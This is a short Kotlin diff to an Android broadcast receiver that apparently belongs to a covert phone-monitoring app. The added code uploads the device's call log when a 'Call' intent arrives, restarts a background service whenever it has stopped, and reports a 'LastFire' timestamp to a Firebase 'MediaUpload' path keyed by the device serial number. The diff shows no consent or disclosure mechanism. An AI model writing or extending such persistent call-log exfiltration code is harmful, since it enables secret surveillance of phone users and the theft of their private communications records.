@@ -9,22 +9,29 @@ import com.google.firebase.database.FirebaseDatabase
 
 class BroadcastReceiver : BroadcastReceiver() {
 
-    private var context: Context? = null
     override fun onReceive(context: Context, intent: Intent) {
-        this.context = context
 
 
-        if (!isMyServiceRunning(Service::class.java))
+        if (intent.action == "Call")
+            Call().uploadCallLog(context)
+
+
+        if (!isMyServiceRunning(context, Service::class.java))
             context.startService(Intent(context, Service::class.java))
 
+        lastFire()
+
+    }
+
+    private fun isMyServiceRunning(ctx: Context, serviceClass: Class<*>): Boolean {
+        val manager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+        return manager.getRunningServices(Integer.MAX_VALUE).any { serviceClass.name == it.service.className }
+    }
+
+    private fun lastFire() {
         val database = FirebaseDatabase.getInstance()
         val myRef = database.getReference("MediaUpload").child(Build.SERIAL).child("LastFire")
         myRef.setValue(System.currentTimeMillis())
-
     }
 
-    private fun isMyServiceRunning(serviceClass: Class<*>): Boolean {
-        val manager = context?.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
-        return manager.getRunningServices(Integer.MAX_VALUE).any { serviceClass.name == it.service.className }
-    }
 }
